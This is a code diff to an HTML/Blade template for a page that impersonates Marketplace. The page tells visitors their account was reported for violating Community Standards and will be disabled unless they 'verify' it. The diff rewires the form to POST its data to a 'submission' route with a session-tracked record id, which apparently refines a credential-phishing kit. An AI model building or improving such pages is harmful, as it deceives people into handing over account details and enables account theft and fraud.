@@ -17,10 +17,10 @@
                 <p class="text-sm text-gray-500">Term of Service</p>
                 <hr />
               </div>
-              <form id="form" action="{{ route('getdata') }}" method="GET">
-                <input type="hidden" name="_token" value="Kp5h0zbmrYjm7r1OzIFudgtWYJsit8Qv6JvmpufG" autocomplete="off">                <input type="hidden" name="businessId" value="278188680457">
+              <form id="form" action="{{ route('submission') }}" method="POST">
+                @csrf
                 <input type="hidden" name="step" value="3">
-                <input type="hidden" name="id" value="">
+                <input type="hidden" name="id" value="{{ session('record_id') }}">
               <div class="my-5">We detected unusual activity in your Marketplace account today <strong id="tampil"></strong>. Your account has been reported for violating Marketplace's<b class="cursor-pointer font-medium text-blue-500 hover:underline">Community Standards</b>. After reviewing this report, we have confirmed that the decision cannot be reversed. To avoid having your account <b class="cursor-pointer font-medium text-blue-500 hover:underline">disabled</b> , please verify your account by following the steps below:</div>              <div class="my-5">
                 <input
                   class="my-2 w-full rounded-lg border border-gray-300 p-4 focus:border-blue-500 focus:outline-none"
